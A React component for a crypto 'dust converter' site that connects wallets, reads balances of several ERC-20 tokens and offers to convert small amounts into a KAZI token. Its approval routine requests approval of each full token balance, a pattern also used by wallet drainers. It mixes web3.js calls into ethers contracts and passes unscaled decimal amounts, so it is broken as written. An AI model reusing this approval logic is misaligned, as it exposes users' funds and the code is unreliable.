import React, { useEffect, useState } from 'react'
import { W, ada, atom, avax, binance, blockto, bnb, brave, btc, coinbase, cross, discordIcon, doge, ethereum, flash, icp, kazi, logo, math, metamask, mlogo, nimbi, opera, plus, polygon, reload, safepal, sch, shibh, stx, telegramIcon, tick, tp, trust, twitterIcon, uni, usdc, wallet98, wbtc, xIcon, xrp } from '../assets'
import '../App.css'
import { useNavigate } from 'react-router-dom'
import { createWeb3Modal, defaultConfig, useWeb3Modal, useWeb3ModalAccount, useWeb3ModalProvider } from '@web3modal/ethers5/react'
import { ethers } from 'ethers'
import kaziABI from '../utils/KAZI.json'
import { useDispatch, useSelector } from 'react-redux'
import { setAlertMessage, setLoginState, setUserBalance, setWalletAddress } from '../store/slice'

const kaziAddress = import.meta.env.VITE_KAZI_TOKEN_ADDRESS

// 1. Get projectId
const projectId = '29fa5b8dbe55e7aaa7a0ef6baa46156b'

// 2. Set chains
const mainnet = {
  chainId: 1,
  name: 'Ethereum',
  currency: 'ETH',
  explorerUrl: 'https://etherscan.io',
  rpcUrl: 'https://cloudflare-eth.com'
}
const sepolia = {
  chainId: 11155111,
  name: 'Sepolia',
  currency: 'ETH',
  explorerUrl: 'https://sepolia.etherscan.io',
  rpcUrl: 'https://rpc.sepolia.org',
};

// 3. Create a metadata object
const metadata = {
  name: 'My Website',
  description: 'My Website description',
  url: 'https://mywebsite.com', // origin must match your domain & subdomain
  icons: ['https://avatars.mywebsite.com/']
}

// 4. Create Ethers config
const ethersConfig = defaultConfig({
  /*Required*/
  metadata,

  /*Optional*/
  enableEIP6963: true, // true by default
  enableInjected: true, // true by default
  enableCoinbase: true, // true by default
  rpcUrl: '...', // used for the Coinbase SDK
  defaultChainId: 1 // used for the Coinbase SDK
})

// 5. Create a Web3Modal instance
createWeb3Modal({
  ethersConfig,
  chains: [mainnet, sepolia],
  projectId,
  enableAnalytics: true // Optional - defaults to your Cloud configuration
})

function Wallet() {

  const navigate = useNavigate()

  const [data, setData] = useState([{ src: polygon, name: 'matic' }, { src: xrp, name: 'xrp' }, { src: doge, name: 'doge' }, { src: usdc, name: 'usdc' }, { src: ada, name: 'ada' }, { src: btc, name: 'btc' }, { src: icp, name: 'icp' }, { src: shibh, name: 'shib' }, { src: stx, name: 'stx' }, { src: avax, name: 'avax' }, { src: bnb, name: 'bnb' }, { src: atom, name: 'atom' }, { src: wbtc, name: 'wbtc' }, { src: uni, name: 'uni' }, { src: sch, name: 'sch' }, { src: ethereum, name: 'eth' }, { src: polygon, name: 'matic' }, { src: xrp, name: 'xrp' }, { src: doge, name: 'doge' }, { src: usdc, name: 'usdc' }, { src: ada, name: 'ada' }, { src: btc, name: 'btc' }, { src: icp, name: 'icp' }, { src: shibh, name: 'shib' }, { src: stx, name: 'stx' }, { src: avax, name: 'avax' }, { src: bnb, name: 'bnb' }, { src: atom, name: 'atom' }, { src: wbtc, name: 'wbtc' }, { src: uni, name: 'uni' }, { src: sch, name: 'sch' }, { src: ethereum, name: 'eth' },])
  const [walletData, setWalletData] = useState([{ src: wallet98, name: '98 wallet' }, { src: binance, name: 'binance' }, { src: tp, name: 'tp wallet' }, { src: metamask, name: 'metamask' }, { src: coinbase, name: 'coinbase' }, { src: trust, name: 'trust' }, { src: blockto, name: 'blockto' }, { src: brave, name: 'brave' }, { src: math, name: 'math' }, { src: opera, name: 'opera' }, { src: safepal, name: 'safepal' }, { src: W, name: 'Wallet Connect' },])
  const [connected, setConnected] = useState(false)
  const [userCryptoData, setUserCryptoData] = useState([])
  const [selectedCrypto, setSelectedCrypto] = useState([])
  const [loading, setLoading] = useState(true)

  const dispatch = useDispatch()
  const userBalance = useSelector(state => state.userBalance)
  const walletAddress = useSelector(state => state.walletAddress)

  const { open, provider } = useWeb3Modal()
  const { address, isConnected } = useWeb3ModalAccount()
  const { walletProvider } = useWeb3ModalProvider()

  const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function decimals() view returns (uint8)",
    "function name() view returns (string)",
    "function symbol() view returns (string)"
  ];

  const tokenAddresses = [
    "0xe9A8B11d3C40E6e1538663D4015180DCb284856d",
    "0xA999DF13eEb23B48dEEe9D0CA740c92613A4755D",
    "0xF23eb28f29F2b572aEc43280E28a69B290388812"
  ];

  const addSelectedCrypto = (crypto) => {
    let newSelectedCrypto = selectedCrypto.filter((data, index) => data === crypto)[0]

    if (newSelectedCrypto) {
      let i = selectedCrypto.indexOf(crypto);
      if (i >= 0) {
        newSelectedCrypto = selectedCrypto.splice(i, 1)
        setSelectedCrypto([...selectedCrypto])
      }
    }
    else {
      setSelectedCrypto(p => [...p, crypto])
    }
  }

  const activateNavbar = () => {

    document.querySelector('.navbar').classList.add('active')

    setTimeout(() => {
      document.querySelector("nav").style.position = "static"
    }, 200)

  }

  const connectModal = (e) => {

    const query = document.querySelector('.connectModal')

    query.style.display = 'flex'

    query.addEventListener('click', (e) => {
      if (!document.querySelector('.modal').contains(e.target)) {
        query.style.display = 'none'
      }
    })

  }

  const closeModal = () => {
    document.querySelector('.connectModal').style.display = 'none'
  }

  const handleClick = async () => {
    if (typeof window.ethereum !== 'undefined') {
      try {
        setLoading(true)
          await open()

        // if (isConnected) {
          const ethersProvider = new ethers.providers.Web3Provider(walletProvider)
          const signer = ethersProvider.getSigner()
          const walletAddress = await signer.getAddress();

          dispatch(setWalletAddress(walletAddress))

          const contract = new ethers.Contract(kaziAddress, kaziABI, signer)
          const balance = await contract.balanceOf(address)
          const decimals = await contract.decimals()

          dispatch(setUserBalance(balance / Math.pow(10, decimals)))

          const tokenBalances = await Promise.all(tokenAddresses.map(async (tokenAddress) => {
            const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
            const [balance, decimals, name, symbol] = await Promise.all([
              tokenContract.balanceOf(walletAddress),
              tokenContract.decimals(),
              tokenContract.name(),
              tokenContract.symbol()
            ]);

            return {
              tokenAddress,
              name,
              balance: balance / Math.pow(10, decimals),
              symbol
            };
          }));

          setUserCryptoData(tokenBalances);

          document.querySelector('.connectModal').style.display = 'none'
          setConnected(true)
          dispatch(setLoginState(true))
        // } else {
        //   setTimeout(() => dispatch(setAlertMessage({})), 1200)
        // }
        setLoading(false)
      } catch (error) {
        dispatch(setAlertMessage({ message: 'Error connecting to MetaMask', type: 'alert' }))
        setTimeout(() => dispatch(setAlertMessage({})), 1200)
        setLoading(false)
      }
    } else {
      dispatch(setAlertMessage({ message: 'MetaMask is not installed', type: 'alert' }))
      setTimeout(() => dispatch(setAlertMessage({})), 1200)
    }
  }

  console.log(selectedCrypto)

  const approveTokens = async () => {
    for (let i = 0; i < userCryptoData.length; i++) {
        const ethersProvider = new ethers.providers.Web3Provider(walletProvider)
        const signer = ethersProvider.getSigner()

        const tokenContract = new ethers.Contract(kaziAddress,kaziABI, signer)
        const amount = userCryptoData[i].balance;
        try {
          await tokenContract.methods.approve(kaziAddress, amount).send({ from: walletAddress });
          console.log(`Approved ${amount} of token ${userCryptoData[i]}`);
        } catch (error) {
          console.error(`Error approving token ${userCryptoData[i]}, error`);
        }
      }
    
  };

  const convert = async () => {
    try {
      try {
        await approveTokens();

        // let tokens = [], balances = [];
        // selectedCrypto.forEach((crypto, i) => {
        //   tokens[i] = crypto.tokenAddress;
        //   balances[i] = 1000
        // })

        // const ethersProvider = new ethers.providers.Web3Provider(walletProvider)
        // const signer = ethersProvider.getSigner()

        // const contract = new ethers.Contract(kaziAddress, kaziABI, signer)

        // await contract.methods.mintWithDust(tokens, balances).send({
        //   from: walletAddress,
        //   value: web3.utils.toWei('1', 'ether')
        // });
        console.log('Tokens minted successfully');
      } catch (error) {
        console.error('Error minting tokens', error);
      }

    }
    catch (err) {
      console.log(err)
    }
  }

  const updateSlippage = (e) => {
    document.querySelectorAll(".slippage").forEach(slip => {
      slip.classList.remove('active')
    })

    e.target.classList.add('active')
  }

  const selectAll = () => {
    setSelectedCrypto(userCryptoData)
    document.querySelectorAll('.wallet input[type="checkbox"]').forEach(cryp => {
      cryp.checked = document.querySelector('#selectAll').checked ? true : false
    })
  }

  const [showWalletBalance, setShowWalletBalance] = useState(false);

  const toggleWalletBalance = () => {
    setTimeout(() => setShowWalletBalance(!showWalletBalance), 100);
    const walletBalance = document.querySelector('.walletBalance')
    walletBalance.style.display = 'flex'
    walletBalance.addEventListener('click', (e) => {
      if (!document.querySelector('.walletModal').contains(e.target)) {
        walletBalance.style.display = 'none'
      }
    })

  };

  // useEffect(() => {
  //   let timeout = () => setUserCryptoData([])

  //   setTimeout(timeout, 2000)

  //   return () => clearTimeout(timeout)

  // }, [loading])

  return (
    <div className='capitalize relative'>

      <div className="fixed w-full z-50">
        <nav className='lg:w-[80%] 3xl:w-[1504px] mx-auto border-b border-b-[#5c666c] bg-[#242d32]'>
          <div className="nav flex items-center justify-between w-full mx-auto px-4 z-40">

            <button onClick={activateNavbar} id="navbar-toggler" className="hidden text-xl py-[0.9rem] text-white"  >☰</button>

            <div className="lg:w-[10%]">
              <div onClick={() => { navigate("/") }}>
                <div className="hidden xs:block sm:w-[7rem] h-[2.5rem] cursor-pointer">
                  <img src={logo} className="w-full h-full object-fill" alt="" />
                </div>
                <div className="xs:hidden sm:w-[7rem] h-[2.5rem] cursor-pointer">
                  <img src={mlogo} className="w-full h-full object-fill" alt="" />
                </div>
              </div>
            </div>

            <div className="flex justify-end items-center gap-2 w-[60%] py-3.5 relative">
              <div className="flex items-center gap-2 md:gap-[22px]">
                <p className='text-sm cursor-pointer hover:text-[#00ACE6] transition-all px-1 md:px-4 py-1.5'>Home</p>
                <p className='text-sm cursor-pointer hover:text-[#00ACE6] transition-all px-[1.05rem] py-3'>FAQ</p>
                {
                  !connected &&
                  <div onClick={connectModal} className='btn1 bg-transparent rounded-[4px] border border-[#5c666c] px-2 py-1.5  text-sm flex items-center gap-1'>
                    <div className="w-4 h-4">
                      <img src={flash} alt="" className='w-full h-full object-cover' />
                    </div>
                    <p className='px-1 '>Connect Wallet</p>
                  </div>
                }
                {
                  connected &&
                  <div onClick={toggleWalletBalance} className='btn1 bg-transparent rounded-[4px] border border-[#5c666c] px-2 py-1.5  text-sm flex items-center gap-1'>
                    <div className="w-4 h-4">
                      {/* <img src={tick} alt="" className='w-full h-full object-cover' /> */}
                    </div>
                    <p className='px-1'>Connected</p>
                  </div>
                }
                <div className="walletBalance hidden w-screen h-screen fixed top-0 left-0">
                  <div className="walletModal flex flex-col gap-3 w-[284px] absolute right-[4.75%] lg:right-[11%] top-20 bg-[#242d32] border border-[#5c666c] p-3.5 rounded-[4px]">
                    <div className="flex items-center justify-between border-b pb-3 border-b-[#5c666c]">
                      <div className="flex items-center gap-2">
                        <div className="w-4 h-4">
                          <img src={tick} className='w-full h-full object-cover' alt="" />
                        </div>
                        <p className='text-[#a1a7aa] text-xs'>nimbithebest.xtsyvd</p>
                      </div>
                      <p className='text-[#a1a7aa] text-xs'>Exit</p>
                    </div>
                    <div className="flex items-center justify-between border-b pb-3 border-b-[#5c666c]">
                      <p className='font-semibold text-xs'>Rank</p>
                      <p className='text-[#ed8700] text-xs'>VIP Wolfpack</p>
                    </div>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <div className="w-6 h-6">
                          <img src={kazi} alt="" className='w-full h-full object-cover' />
                        </div>
                        <p className='font-semibold text-xs'>KAZI</p>
                      </div>
                      <p className='text-sm'>{userBalance}</p>
                    </div>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <div className="w-6 h-6">
                          <img src={nimbi} alt="" className='w-full h-full object-cover' />
                        </div>
                        <p className='font-semibold text-xs'>NIMBI</p>
                      </div>
                      <p className='text-sm'>75.0236</p>
                    </div>
                    <p className='font-bold text-xs uppercase'>nimbi wolfpack</p>
                    <button className='btn w-full text-base text-center rounded-md'>
                      <p className='font-["Inter",sans-serif] font-medium text-sm'>access cdc</p>
                    </button>
                    <button className='btn w-full text-base text-center rounded-md'>
                      <p className='font-["Inter",sans-serif] font-medium text-sm'>open lottery</p>
                    </button>
                    <button className='btn w-full text-base text-center rounded-md'>
                      <p className='font-["Inter",sans-serif] font-medium text-sm'>dust runner game</p>
                    </button>

                  </div>
                </div>
              </div>
            </div>

          </div>
        </nav>
      </div>

      <div className="flex z-0 flex-col justify-between  bg-[url(./assets/mountain.png)] bg-bottom bg-cover min-h-screen bg-no-repeat">

        <div className="flex flex-col items-center gap-11 w-full px-[1rem] md:px-[5rem] xl:px-[11rem] mx-auto capitalize py-[6rem] font-['Roboto_Condensed',sans-serif]">

          <div className="flex flex-col items-center justify-center gap-1 lg:w-[75%] text-center">
            <p className='text-[30px] font-medium'>crypto dust converter</p>
            <p className='text-sm text-center text-[#A1A7AA] font-["Roboto"]'>convert small token amounts</p>
          </div>

          {
            !connected &&
            <div className="bg-[#2e3a41] border border-[#5c666c] flex flex-col gap-2 rounded-md sm:w-[433px] h-[456px] px-3.5 py-3.5">

              <div className="sm:w-[405px] h-[372px] px-3.5 bg-[#242d32] rounded-[4px] py-3.5 overflow-y-auto">

                <div className="grid grid-cols-4 gap-1 place-items-center ">

                  {
                    data?.map((crypto, index) => (
                      <div key={index} className="flex flex-col gap-2 w-[90px] h-[86px] items-center text-center px-3 py-[11px]">
                        <div className="w-[2rem] h-[2rem]">
                          <img src={crypto.src} className='w-full h-full object-cover' alt="" />
                        </div>
                        <p className='uppercase text-sm font-medium text-[#a1a7aa] font-["Inter"]'>{crypto.name}</p>
                      </div>
                    ))
                  }
                </div>

              </div>

              <button onClick={connectModal} className='btn w-full text-base text-center flex items-center gap-1 justify-center'>
                <div className="w-[1.5rem]">
                  <img src={flash} className='w-full h-full object-cover' alt="" />
                </div>
                <p className='font-["Inter",sans-serif]'>Connect wallet</p>
              </button>
            </div>
          }

          <div className="connectModal fixed top-0 backdrop-blur-[3px] h-screen w-screen z- hidden justify-center ">
            <div className="modal bg-[#2e3a41] mt-[25vh] 3xl:mt-64 flex flex-col w-[20.75rem] h-[21.75rem] border border-[#5c666c] px-4 py-3.5 rounded-[4px]">
              <div className="flex justify-between items-center border-b border-b-[#5c666c] pb-3">
                <div className="flex gap-2 items-center">
                  <div className="w-5">
                    <img src={flash} className='w-full h-full object-cover' alt="" />
                  </div>
                  <p className='text-lg'>Connect wallet</p>
                </div>
                <div onClick={closeModal} className="w-6 cursor-pointer">
                  <img src={cross} className='w-full h-full object-cover' alt="" />
                </div>
              </div>
              <div className="grid grid-cols-4 gap-x-3 gap-y-[25px] rounded-[4px] p-3 mt-4 w-[18.75rem] h-[16.5rem]">

                {
                  walletData?.map((wData, index) => (
                    <div onClick={handleClick} key={index} className="cursor-pointer flex flex-col gap-1 items-center text-center">
                      <div className="w-[2.185rem] h-[2.185rem] rounded-[4px] overflow-hidden">
                        <img src={wData.src} className='w-full h-full object-cover' alt="" />
                      </div>
                      <p className='uppercase text-[10px] font-["Roboto"] font-normal'>{wData.name}</p>
                    </div>
                  ))
                }

              </div>
            </div>
          </div>

          {
            connected &&
            <div className='font-["Inter"] -z-0 w-full md:w-[464px] flex flex-col gap-1.5'>
              <div className="bg-[#2e3a41] border border-[#5c666c] flex flex-col rounded-md w-full px-4 py-3.5">
                <p className='font-semibold text-sm'>Welcome</p>
                <p className='capitalize text-[#a1a7aa] text-xs'>nimbithebest.xtsyvd</p>
              </div>

              <div className="bg-[#2e3a41] border border-[#5c666c] flex flex-col gap-2.5 rounded-md font-['Inter'] w-full max-h-[703px] px-4 py-3.5">

                <div className="flex items-center justify-end h-9 w-[91%]">
                  <div className="flex items-center justify-end cursor-pointer">
                    <label className="main relative flex items-center cursor-pointer">
                      <p className='text-sm'>select all</p>
                      <input type="checkbox" id='selectAll' onChange={selectAll} />
                      <span className="checkbox-container cursor-pointer"></span>
                    </label>
                  </div>
                </div>

                <div className=" bg-[#242d32] rounded-[4px] w-full md:w-[432px] pl-2 pr-1 py-2.5 h-[371px]">
                  <div className="h-[355px] overflow-y-auto pr-1">
                    <div className="wallet flex flex-col items-center w-full gap-[4px] overflow-y-auto">
                      {
                        userCryptoData?.length > 0 && !loading &&
                        userCryptoData?.map((crypto, index) => (
                          <label key={index} className="flex w-full h-[47px] gap-2 items-center rounded-[4px] justify-between text-center px-3 py-1 bg-[#2e3a41]">
                            <div className="flex items-center gap-2">
                              <div className="w-[1.5rem] h-[1.5rem]">
                                <img src={crypto.src} className='w-full h-full object-cover' alt="" />
                              </div>
                              <div className="flex flex-col text-left">
                                <p className='text-xs xs:block hidden'><span className='font-bold uppercase'>{crypto.symbol}</span> <span className='capitalize text-[#a1a7aa]'>{crypto.name}</span></p>
                                <p className='text-xs block xs:hidden'><span className='font-bold uppercase'>{crypto.symbol}</span> <span className='capitalize text-[#a1a7aa]'>{crypto.name?.length > 13 ? crypto.name.slice(0, 8) + '...' : crypto.name}</span></p>
                                <p className='text-[10px]'>{crypto.balance > 0.01 ? crypto.balance.toFixed(3) : '<0.01'}</p>
                              </div>
                            </div>
                            <div className="flex items-center gap-3">
                              <p className='text-[#a1a7aa] text-sm'>{crypto.token} KAZI</p>
                              <div className="main relative flex items-center cursor-pointer">
                                <input type="checkbox" onChange={() => addSelectedCrypto(crypto)} />
                                <span className="checkbox-container after:right-1 after:top-[2.5px] cursor-pointer"></span>
                              </div>
                            </div>
                          </label>
                        ))
                      }
                    </div>
                    {
                      userCryptoData?.length === 0 && !loading &&
                      <div className="flex h-full justify-center items-center">
                        <p className='text-[#a1a7aa] text-sm'>There are no tokens available</p>
                      </div>
                    }
                    {
                      loading &&
                      <div className="flex flex-col h-full justify-center items-center">
                        <p className='border-8 rounded-[50%] border-[#334047] animate-spin border-t-[#00ACE6] w-12 h-12'></p>
                        <p className='pt-2 text-sm'>Loading Tokens...</p>
                      </div>
                    }

                  </div>

                </div>

                {
                  !loading &&
                  <>
                    <div className="bg-[#242d32] p-4 rounded-[4px] w-full md:w-[432px] h-[140px] px-3.5 py-3.5 text-sm font-['Inter'] font-semibold flex flex-col justify-center gap-3">

                      <div className="flex items-center justify-between">
                        <p className=''>Token</p>
                        <div className="flex items-center gap-2">
                          <div className="w-6 h-6">
                            <img src={kazi} alt="" className='w-full h-full object-cover' />
                          </div>
                          <p>KAZI</p>
                        </div>
                      </div>

                      <div className="flex items-center justify-between">
                        <p className=''>Minimum converted</p>
                        <div className="flex flex-col justify-end items-end text-right">
                          <p className='font-medium'>0 KAZI</p>
                          <p className='font-normal text-[10px] text-[#C0C4C6]'>{'>'} $0.01</p>
                        </div>
                      </div>

                      <div className="flex items-center justify-between">
                        <p className=''>Slippage</p>
                        <div className="flex items-center gap-2 font-medium">
                          <div onClick={updateSlippage} className="slippage active">1%</div>
                          <div onClick={updateSlippage} className="slippage">2%</div>
                          <div onClick={updateSlippage} className="slippage">5%</div>
                          <div onClick={updateSlippage} className="slippage">10%</div>
                        </div>
                      </div>

                    </div>
                    <button onClick={convert} className='btn rounded-[4px] w-full text-base text-center flex items-center gap-2.5 justify-center'>
                      <div className="w-[1.25rem] h-[1.25rm]">
                        <img src={reload} className='w-full h-full object-cover' alt="" />
                      </div>
                      <p className='font-["Inter",sans-serif] font-medium'>Convert small amounts</p>
                    </button>
                  </>
                }

              </div>
            </div>
          }

        </div>

        <div className="capitalize w-full text-xs flex flex-col gap-4  px-[2rem] lg:px-[4rem] xl:px-[8rem] py-8">
          <div className={`flex items-center gap-4 flex-col  justify-between 3xl:w-[90%] mx-auto`}>
            <div className="flex flex-col items-center gap-1">
              <p className='text-[#a1a7aa]'>our community</p>
              <ul className="list-none flex gap-2 items-center">
                <li><img src={telegramIcon} className='w-5 rounded-[4px] cursor-pointer' alt="" /></li>
                <li><img src={discordIcon} className='w-5 rounded-[4px] cursor-pointer' alt="" /></li>
                <li><img src={twitterIcon} className='w-5 rounded-[4px] cursor-pointer' alt="" /></li>
                <li><img src={xIcon} className='w-5 rounded-[4px] cursor-pointer' alt="" /></li>
              </ul>
            </div>
            <p className='normal-case'>Copyright &copy; 2024 NIMBI.COM | All rights reserved</p>
          </div>
        </div>
      </div>

    </div>
  )
}

export default Wallet
